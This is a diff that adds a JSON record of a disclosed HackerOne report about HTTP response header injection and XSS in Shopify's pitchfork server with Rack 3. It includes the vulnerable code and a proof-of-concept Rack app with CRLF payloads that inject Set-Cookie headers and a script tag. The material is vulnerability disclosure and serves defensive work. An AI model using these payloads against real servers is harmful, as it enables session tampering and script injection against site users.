@@ -1,0 +1,199 @@
+{
+  "id": 2279572,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMjc5NTcy",
+  "url": "https://hackerone.com/reports/2279572",
+  "title": "HTTP Response Header Injection in shopify/pitchfork + Rack 3",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "low",
+  "readable_substate": "Resolved",
+  "created_at": "2023-12-10T06:13:31.712Z",
+  "submitted_at": "2023-12-10T06:13:31.895Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "ooooooo_q",
+    "url": "/ooooooo_q",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/138615d5c19727b74899a5b879acb82f57f7446f7ab81db05d726378ba645e78"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 1382,
+    "url": "https://hackerone.com/shopify",
+    "handle": "shopify",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/727634197f209244e4307a490cdcd36c76d6e37fef1b0c164bd35ac010105f99",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/91b2506fe54e617e9b2199fff02f67a626ec348f74368200b42055b3004dd8a8"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Shopify",
+      "twitter_handle": "",
+      "website": "https://www.shopify.com",
+      "about": "Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2025-30221"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2025-03-27T14:37:52.299Z",
+  "bug_reporter_agreed_on_going_public_at": "2024-07-01T22:55:16.315Z",
+  "team_member_agreed_on_going_public_at": "2025-03-27T14:37:52.007Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "I have confirmed HTTP response header injection and XSS in combination of [pitchfork](https://github.com/Shopify/pitchfork) + Rack 3.\n\nHere's where the problem is in the code.\n\nhttps://github.com/Shopify/pitchfork/blob/v0.10.0/lib/pitchfork/http_response.rb#L23C1-L33C8\n\n```ruby\n    def append_header(buf, key, value)\n      case value\n      when Array # Rack 3\n        value.each { |v| buf << \"#{key}: #{v}\\r\\n\" }\n      when /\\n/ # Rack 2\n        # avoiding blank, key-only cookies with /\\n+/\n        value.split(/\\n+/).each { |v| buf << \"#{key}: #{v}\\r\\n\" }\n      else\n        buf << \"#{key}: #{value}\\r\\n\"\n      end\n    end\n```    \n\nWhen using Rack 3, `\\n` contained in value will be displayed as is in the output.\n\n---\n\n\n## PoC\n\n```\n❯ ruby -v\nruby 3.2.2 (2023-03-30 revision e51014f9c0) [arm64-darwin22]\n\n❯ cat Gemfile\n# frozen_string_literal: true\n\nsource \"https://rubygems.org\"\n\ngem 'pitchfork', '~> 0.10.0'%\n\n❯ bundle install\n=> install rack (3.0.8)\n```\n\nnginx.conf\n\n```\nevents {\n    worker_connections  16;\n}\nhttp {\n    server {\n        listen 80;\n        server_name localhost;\n\n        location / {\n            proxy_pass http://host.docker.internal:3000/;\n            \n            proxy_redirect off;\n        }\n    }\n}\n```\n\ninjection.ru\n\n```ruby\nclass PitchForkHeaderInjection\n  def call(env)\n    params =  Rack::Request.new(env).params\n    location = if params[\"mode\"] == \"rn\"\n                 [\"a\\r\\nSet-cookie: injected=value\"]\n               elsif params[\"mode\"] == \"r\"\n                 [\"b\\rSet-cookie: injected_2=value2\"]\n               elsif params[\"mode\"] == \"n\"\n                 [\"c\\nSet-cookie: injected_3=value3\"]\n               elsif params[\"mode\"] == \"b\"\n                 [\"d\\r\\n\\r\\n<script>alert(location)</script>\"]\n               else \n                  [\"\"]\n               end\n\n    [ 200,\n      {\n       'content-type' => 'text/html',\n        'location' => location\n        },\n      [\"\"]\n    ]\n  end\nend\n\nrun PitchForkHeaderInjection.new\n```\n\nStart server\n\n```\n❯ docker run --name pitchfork_header -v $(pwd)/nginx.conf:/etc/nginx/nginx.conf:ro -d -p 8080:80 nginx \n\n❯ RACK_ENV=production bundle exec pitchfork -p 3000 injection.ru\n# If RACK_ENV=production is not present, an error will occur due to Rack::Lint.\n```\n\n\n### Access from browser\n\nhttp://localhost:8080/?mode=rn \n\n{F2913343}\n\nhttp://localhost:8080/?mode=r\n\n{F2913344}\n\nhttp://localhost:8080/?mode=n\n\n{F2913345}\n\nCookie status\n\n{F2913347}\n\nHeader injection succeeds in case of `r\\n` and `\\n`. If only `\\r`, nginx will prevent it.\n\n\nhttp://localhost:8080/?mode=b\n\n{F2913349}\n\nSince `r\\n` can be inserted, the response body can also be spoofed and XSS will be fired.\n\n## Impact\n\nIf attacker can manipulate the redirect destination or cookie value, HTTP response header injection and XSS is possible.\n(Past cases https://hackerone.com/reports/904059#activity-8945588 )\n\nIn the case of Rack 2, the value of `\\n` is not included, and nginx prevents `\\r`, so it is not treated as a vulnerability.\n(Discussion on Unicorn https://yhbt.net/unicorn-public/20210226111552.GA22901@dcvr/T/#t )",
+  "bounty_amount": "800.0",
+  "formatted_bounty": "$800",
+  "weakness": {
+    "id": 1,
+    "name": "HTTP Response Splitting"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 2913343,
+      "file_name": "mode_rn.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/nis2g05jjacvk4sjm9jpypmakkyc?response-content-disposition=attachment%3B%20filename%3D%22mode_rn.png%22%3B%20filename%2A%3DUTF-8%27%27mode_rn.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ62LGVSLA%2F20250704%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250704T200244Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECsaCXVzLXdlc3QtMiJHMEUCIFPdr2Trm0GRiXGCw4CNfQk2iHwvUPrU5%2FvFENop2S6yAiEAi9%2FphzW1uHbgE0JrdKmkK0melBihWntgp5DGDDXZ%2F8QqsgUINBADGgwwMTM2MTkyNzQ4NDkiDBsxsridemvzYiTYEiqPBSh5YUa8EX5ZdLaLGKogIqwYN8bAUQRRJQfh%2BTC6p3mDVcED0F8zBD5UcdyRtteVCb8%2FB6Z8FtW%2BnNaRj7HTuvc%2BrHY0rbGWl5a3ReXJH8WIDYZ009p4SPvlI8Vw7YR0ButR4WvMICeM9qnV9bwgW7dUzGahNa%2BNYGxUFPA8c5eyw6Zio%2FaxtG1moiro8reOtZCFPzXqNnrDMEjaT3ehtUQSq93vyXmM%2Fu2kpmTmW%2B%2Be5qltV9C2jIoR9OuZHq2uggIcjunr5uefgi010OIsdJN2JR6hIntQH1ZQIZx5LIhKFmR6RuJu6VHa7TYFGbsloawAB09IlORWtZ2%2B0Ow6D%2BEQ965833CoK25v3ngm6lGCiN2948nptsrMPPmV2TmiAn%2Fn3GZInjAqXvyhq1cjuKezSCnHF3LvtHoy6f%2Fb9YWFYIYjydGvfQ%2BZN1xJybbcS%2FUoa3tMQoCZhKOnntgYTq0dPB5XNhnymNRwCgQWdxrbRT5Ho0%2FDySGIYJzN6B628lQ2hROxPeti5vn5GSVJBwFqOEZs7K57bvrbZm%2FukphV%2BN2RkfYgTW99Xk%2Bw5LonxrzyVNs72qARy0OMOS6BtVec3ia4WY9o%2F5ay87zkSacjEfEU1wyg3Y9vCR%2Bi3Mhfy8oog2qbEvOnA030sAv22YM9hxUw%2FT%2FNRATGvTwI88z%2Bxu7fXwfbfCPM6aV3RXWhvNEE2uy2tDc5CkCxBMvQoL1N8i6geqmohUg7pllEtt%2F305x%2FyXK9OzUXs6B9StQQZazGgPVLEzc%2FXFLEP5Eb%2FFuHH1phMZq5fSuaQEQi8bp593p0i%2BInkr3NW%2FD9HFRikw%2BR6vm0VJH5CnNE1JCDlcQ1AQtbysqb%2F5likKGgvaAwlcKgwwY6sQHXT6SKUvGLZewU1n0oDpjWHQu1Y8JqFhznbgQG4bm7Ng3VjLkHnLaEGy0gD%2FHYnyLb1NfL4YN8iiY6M4x0h4KO1zKnBnGtSVQazjKfzzwV4UwSRXaE5FVy9F3ZasZzmRsu5%2FGaNDYF3FOhnE0Xs%2FZdtcDDB6B%2FloxdlCRs44mEn0mXHBbWqjnI7LvYTf2Q%2Bmk242Go%2FtQmC52IOX9eVHkfodt9B%2F6cebfZUl01jOAQEzA%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1b3a2f867bc37621371b82b8c8c9efec19d223f75669555239c3a02002ce8812",
+      "file_size": 99347,
+      "type": "image/png",
+      "moderated": false
+    },
+    {
+      "id": 2913344,
+      "file_name": "mode_r.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/plx0rrnj0iy2jgs0tg57y67wftad?response-content-disposition=attachment%3B%20filename%3D%22mode_r.png%22%3B%20filename%2A%3DUTF-8%27%27mode_r.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ62LGVSLA%2F20250704%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250704T200244Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECsaCXVzLXdlc3QtMiJHMEUCIFPdr2Trm0GRiXGCw4CNfQk2iHwvUPrU5%2FvFENop2S6yAiEAi9%2FphzW1uHbgE0JrdKmkK0melBihWntgp5DGDDXZ%2F8QqsgUINBADGgwwMTM2MTkyNzQ4NDkiDBsxsridemvzYiTYEiqPBSh5YUa8EX5ZdLaLGKogIqwYN8bAUQRRJQfh%2BTC6p3mDVcED0F8zBD5UcdyRtteVCb8%2FB6Z8FtW%2BnNaRj7HTuvc%2BrHY0rbGWl5a3ReXJH8WIDYZ009p4SPvlI8Vw7YR0ButR4WvMICeM9qnV9bwgW7dUzGahNa%2BNYGxUFPA8c5eyw6Zio%2FaxtG1moiro8reOtZCFPzXqNnrDMEjaT3ehtUQSq93vyXmM%2Fu2kpmTmW%2B%2Be5qltV9C2jIoR9OuZHq2uggIcjunr5uefgi010OIsdJN2JR6hIntQH1ZQIZx5LIhKFmR6RuJu6VHa7TYFGbsloawAB09IlORWtZ2%2B0Ow6D%2BEQ965833CoK25v3ngm6lGCiN2948nptsrMPPmV2TmiAn%2Fn3GZInjAqXvyhq1cjuKezSCnHF3LvtHoy6f%2Fb9YWFYIYjydGvfQ%2BZN1xJybbcS%2FUoa3tMQoCZhKOnntgYTq0dPB5XNhnymNRwCgQWdxrbRT5Ho0%2FDySGIYJzN6B628lQ2hROxPeti5vn5GSVJBwFqOEZs7K57bvrbZm%2FukphV%2BN2RkfYgTW99Xk%2Bw5LonxrzyVNs72qARy0OMOS6BtVec3ia4WY9o%2F5ay87zkSacjEfEU1wyg3Y9vCR%2Bi3Mhfy8oog2qbEvOnA030sAv22YM9hxUw%2FT%2FNRATGvTwI88z%2Bxu7fXwfbfCPM6aV3RXWhvNEE2uy2tDc5CkCxBMvQoL1N8i6geqmohUg7pllEtt%2F305x%2FyXK9OzUXs6B9StQQZazGgPVLEzc%2FXFLEP5Eb%2FFuHH1phMZq5fSuaQEQi8bp593p0i%2BInkr3NW%2FD9HFRikw%2BR6vm0VJH5CnNE1JCDlcQ1AQtbysqb%2F5likKGgvaAwlcKgwwY6sQHXT6SKUvGLZewU1n0oDpjWHQu1Y8JqFhznbgQG4bm7Ng3VjLkHnLaEGy0gD%2FHYnyLb1NfL4YN8iiY6M4x0h4KO1zKnBnGtSVQazjKfzzwV4UwSRXaE5FVy9F3ZasZzmRsu5%2FGaNDYF3FOhnE0Xs%2FZdtcDDB6B%2FloxdlCRs44mEn0mXHBbWqjnI7LvYTf2Q%2Bmk242Go%2FtQmC52IOX9eVHkfodt9B%2F6cebfZUl01jOAQEzA%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b78f695c317b6709fb616930d03691f1f779e7d37f2443ae4f4b12b271a0d7c1",
+      "file_size": 88894,
+      "type": "image/png",
+      "moderated": false
+    },
+    {
+      "id": 2913345,
+      "file_name": "mode_n.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/7lhw2t4wh6c9y0klh6u2lv3kg7aq?response-content-disposition=attachment%3B%20filename%3D%22mode_n.png%22%3B%20filename%2A%3DUTF-8%27%27mode_n.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ62LGVSLA%2F20250704%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250704T200244Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECsaCXVzLXdlc3QtMiJHMEUCIFPdr2Trm0GRiXGCw4CNfQk2iHwvUPrU5%2FvFENop2S6yAiEAi9%2FphzW1uHbgE0JrdKmkK0melBihWntgp5DGDDXZ%2F8QqsgUINBADGgwwMTM2MTkyNzQ4NDkiDBsxsridemvzYiTYEiqPBSh5YUa8EX5ZdLaLGKogIqwYN8bAUQRRJQfh%2BTC6p3mDVcED0F8zBD5UcdyRtteVCb8%2FB6Z8FtW%2BnNaRj7HTuvc%2BrHY0rbGWl5a3ReXJH8WIDYZ009p4SPvlI8Vw7YR0ButR4WvMICeM9qnV9bwgW7dUzGahNa%2BNYGxUFPA8c5eyw6Zio%2FaxtG1moiro8reOtZCFPzXqNnrDMEjaT3ehtUQSq93vyXmM%2Fu2kpmTmW%2B%2Be5qltV9C2jIoR9OuZHq2uggIcjunr5uefgi010OIsdJN2JR6hIntQH1ZQIZx5LIhKFmR6RuJu6VHa7TYFGbsloawAB09IlORWtZ2%2B0Ow6D%2BEQ965833CoK25v3ngm6lGCiN2948nptsrMPPmV2TmiAn%2Fn3GZInjAqXvyhq1cjuKezSCnHF3LvtHoy6f%2Fb9YWFYIYjydGvfQ%2BZN1xJybbcS%2FUoa3tMQoCZhKOnntgYTq0dPB5XNhnymNRwCgQWdxrbRT5Ho0%2FDySGIYJzN6B628lQ2hROxPeti5vn5GSVJBwFqOEZs7K57bvrbZm%2FukphV%2BN2RkfYgTW99Xk%2Bw5LonxrzyVNs72qARy0OMOS6BtVec3ia4WY9o%2F5ay87zkSacjEfEU1wyg3Y9vCR%2Bi3Mhfy8oog2qbEvOnA030sAv22YM9hxUw%2FT%2FNRATGvTwI88z%2Bxu7fXwfbfCPM6aV3RXWhvNEE2uy2tDc5CkCxBMvQoL1N8i6geqmohUg7pllEtt%2F305x%2FyXK9OzUXs6B9StQQZazGgPVLEzc%2FXFLEP5Eb%2FFuHH1phMZq5fSuaQEQi8bp593p0i%2BInkr3NW%2FD9HFRikw%2BR6vm0VJH5CnNE1JCDlcQ1AQtbysqb%2F5likKGgvaAwlcKgwwY6sQHXT6SKUvGLZewU1n0oDpjWHQu1Y8JqFhznbgQG4bm7Ng3VjLkHnLaEGy0gD%2FHYnyLb1NfL4YN8iiY6M4x0h4KO1zKnBnGtSVQazjKfzzwV4UwSRXaE5FVy9F3ZasZzmRsu5%2FGaNDYF3FOhnE0Xs%2FZdtcDDB6B%2FloxdlCRs44mEn0mXHBbWqjnI7LvYTf2Q%2Bmk242Go%2FtQmC52IOX9eVHkfodt9B%2F6cebfZUl01jOAQEzA%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a8715536ac122990b310d9a85793c659f01c0c50180a3f4d5b205c3983a96cc6",
+      "file_size": 95066,
+      "type": "image/png",
+      "moderated": false
+    },
+    {
+      "id": 2913347,
+      "file_name": "injected_cookie.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/7wbxqh3bgfwu04wzjbt0iuvn9clt?response-content-disposition=attachment%3B%20filename%3D%22injected_cookie.png%22%3B%20filename%2A%3DUTF-8%27%27injected_cookie.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ62LGVSLA%2F20250704%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250704T200244Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECsaCXVzLXdlc3QtMiJHMEUCIFPdr2Trm0GRiXGCw4CNfQk2iHwvUPrU5%2FvFENop2S6yAiEAi9%2FphzW1uHbgE0JrdKmkK0melBihWntgp5DGDDXZ%2F8QqsgUINBADGgwwMTM2MTkyNzQ4NDkiDBsxsridemvzYiTYEiqPBSh5YUa8EX5ZdLaLGKogIqwYN8bAUQRRJQfh%2BTC6p3mDVcED0F8zBD5UcdyRtteVCb8%2FB6Z8FtW%2BnNaRj7HTuvc%2BrHY0rbGWl5a3ReXJH8WIDYZ009p4SPvlI8Vw7YR0ButR4WvMICeM9qnV9bwgW7dUzGahNa%2BNYGxUFPA8c5eyw6Zio%2FaxtG1moiro8reOtZCFPzXqNnrDMEjaT3ehtUQSq93vyXmM%2Fu2kpmTmW%2B%2Be5qltV9C2jIoR9OuZHq2uggIcjunr5uefgi010OIsdJN2JR6hIntQH1ZQIZx5LIhKFmR6RuJu6VHa7TYFGbsloawAB09IlORWtZ2%2B0Ow6D%2BEQ965833CoK25v3ngm6lGCiN2948nptsrMPPmV2TmiAn%2Fn3GZInjAqXvyhq1cjuKezSCnHF3LvtHoy6f%2Fb9YWFYIYjydGvfQ%2BZN1xJybbcS%2FUoa3tMQoCZhKOnntgYTq0dPB5XNhnymNRwCgQWdxrbRT5Ho0%2FDySGIYJzN6B628lQ2hROxPeti5vn5GSVJBwFqOEZs7K57bvrbZm%2FukphV%2BN2RkfYgTW99Xk%2Bw5LonxrzyVNs72qARy0OMOS6BtVec3ia4WY9o%2F5ay87zkSacjEfEU1wyg3Y9vCR%2Bi3Mhfy8oog2qbEvOnA030sAv22YM9hxUw%2FT%2FNRATGvTwI88z%2Bxu7fXwfbfCPM6aV3RXWhvNEE2uy2tDc5CkCxBMvQoL1N8i6geqmohUg7pllEtt%2F305x%2FyXK9OzUXs6B9StQQZazGgPVLEzc%2FXFLEP5Eb%2FFuHH1phMZq5fSuaQEQi8bp593p0i%2BInkr3NW%2FD9HFRikw%2BR6vm0VJH5CnNE1JCDlcQ1AQtbysqb%2F5likKGgvaAwlcKgwwY6sQHXT6SKUvGLZewU1n0oDpjWHQu1Y8JqFhznbgQG4bm7Ng3VjLkHnLaEGy0gD%2FHYnyLb1NfL4YN8iiY6M4x0h4KO1zKnBnGtSVQazjKfzzwV4UwSRXaE5FVy9F3ZasZzmRsu5%2FGaNDYF3FOhnE0Xs%2FZdtcDDB6B%2FloxdlCRs44mEn0mXHBbWqjnI7LvYTf2Q%2Bmk242Go%2FtQmC52IOX9eVHkfodt9B%2F6cebfZUl01jOAQEzA%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=50d01d8317cd0d3188830d8be57b1b8a3e4cb68020f4c00c3367c3a4a4cb65c2",
+      "file_size": 67630,
+      "type": "image/png",
+      "moderated": false
+    },
+    {
+      "id": 2913349,
+      "file_name": "mode_b.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/exw7tclyiudxmwj83rnd4yzrt1zf?response-content-disposition=attachment%3B%20filename%3D%22mode_b.png%22%3B%20filename%2A%3DUTF-8%27%27mode_b.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ62LGVSLA%2F20250704%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250704T200244Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECsaCXVzLXdlc3QtMiJHMEUCIFPdr2Trm0GRiXGCw4CNfQk2iHwvUPrU5%2FvFENop2S6yAiEAi9%2FphzW1uHbgE0JrdKmkK0melBihWntgp5DGDDXZ%2F8QqsgUINBADGgwwMTM2MTkyNzQ4NDkiDBsxsridemvzYiTYEiqPBSh5YUa8EX5ZdLaLGKogIqwYN8bAUQRRJQfh%2BTC6p3mDVcED0F8zBD5UcdyRtteVCb8%2FB6Z8FtW%2BnNaRj7HTuvc%2BrHY0rbGWl5a3ReXJH8WIDYZ009p4SPvlI8Vw7YR0ButR4WvMICeM9qnV9bwgW7dUzGahNa%2BNYGxUFPA8c5eyw6Zio%2FaxtG1moiro8reOtZCFPzXqNnrDMEjaT3ehtUQSq93vyXmM%2Fu2kpmTmW%2B%2Be5qltV9C2jIoR9OuZHq2uggIcjunr5uefgi010OIsdJN2JR6hIntQH1ZQIZx5LIhKFmR6RuJu6VHa7TYFGbsloawAB09IlORWtZ2%2B0Ow6D%2BEQ965833CoK25v3ngm6lGCiN2948nptsrMPPmV2TmiAn%2Fn3GZInjAqXvyhq1cjuKezSCnHF3LvtHoy6f%2Fb9YWFYIYjydGvfQ%2BZN1xJybbcS%2FUoa3tMQoCZhKOnntgYTq0dPB5XNhnymNRwCgQWdxrbRT5Ho0%2FDySGIYJzN6B628lQ2hROxPeti5vn5GSVJBwFqOEZs7K57bvrbZm%2FukphV%2BN2RkfYgTW99Xk%2Bw5LonxrzyVNs72qARy0OMOS6BtVec3ia4WY9o%2F5ay87zkSacjEfEU1wyg3Y9vCR%2Bi3Mhfy8oog2qbEvOnA030sAv22YM9hxUw%2FT%2FNRATGvTwI88z%2Bxu7fXwfbfCPM6aV3RXWhvNEE2uy2tDc5CkCxBMvQoL1N8i6geqmohUg7pllEtt%2F305x%2FyXK9OzUXs6B9StQQZazGgPVLEzc%2FXFLEP5Eb%2FFuHH1phMZq5fSuaQEQi8bp593p0i%2BInkr3NW%2FD9HFRikw%2BR6vm0VJH5CnNE1JCDlcQ1AQtbysqb%2F5likKGgvaAwlcKgwwY6sQHXT6SKUvGLZewU1n0oDpjWHQu1Y8JqFhznbgQG4bm7Ng3VjLkHnLaEGy0gD%2FHYnyLb1NfL4YN8iiY6M4x0h4KO1zKnBnGtSVQazjKfzzwV4UwSRXaE5FVy9F3ZasZzmRsu5%2FGaNDYF3FOhnE0Xs%2FZdtcDDB6B%2FloxdlCRs44mEn0mXHBbWqjnI7LvYTf2Q%2Bmk242Go%2FtQmC52IOX9eVHkfodt9B%2F6cebfZUl01jOAQEzA%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0755e5adbf83a7c245ee1503b460a6ff1cc7e58172497cca2d4df46cff4c09e6",
+      "file_size": 85219,
+      "type": "image/png",
+      "moderated": false
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 129,
+  "voters": [
+    "gracewalker",
+    "aboalezz",
+    "bugbountyfull",
+    "zy9ard3",
+    "xgoon",
+    "ayux",
+    "2026",
+    "chupa-chups",
+    "uoqki",
+    "mohaned0101",
+    "and 119 more..."
+  ],
+  "severity": {
+    "rating": "low",
+    "score": 3.6,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "required",
+      "scope": "unchanged",
+      "confidentiality": "none",
+      "integrity": "low",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 596023,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/Shopify/*",
+    "max_severity": "medium"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "id": 662615,
+      "category": "team",
+      "content": "HTTP response header injection in Pitchfork version **0.10.0** when used with Rack 3. The vulnerability stems from improper handling of header values containing newline characters `\\n` in the `append_header` method of the HTTP response module. When Rack 3 was in use, newline characters in values were not properly sanitized and were displayed as-is in the output, enabling header injection. For more details, see the security advisory [GHSA-pfqj-w6r6-g86v](https://github.com/Shopify/pitchfork/security/advisories/GHSA-pfqj-w6r6-g86v) (CVE-2025-30221). ",
+      "updated_at": "2025-03-27T14:36:17.287Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 2531826,
+        "username": "lewis_shopify",
+        "name": "Lewis ",
+        "bio": "",
+        "cleared": false,
+        "verified": false,
+        "website": null,
+        "location": "",
+        "created_at": "2022-12-19T18:43:06.807Z",
+        "url": "https://hackerone.com/lewis_shopify",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "company",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/m4sv1ho77oki9dcpchccs2yxcldr/36bca6668139d77be42208d896968344ae7a76c55ee0f8b0f28281ccd492ff02",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/m4sv1ho77oki9dcpchccs2yxcldr/19c85a12ac35f466af1ea2b0ae853bfe5e8f057fb1d6fb62db131707bb67b30d",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/m4sv1ho77oki9dcpchccs2yxcldr/41e80259f0e9503ef154e10f39296dbefc2217dd885433e52a9107ef82fe7535"
+        }
+      }
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
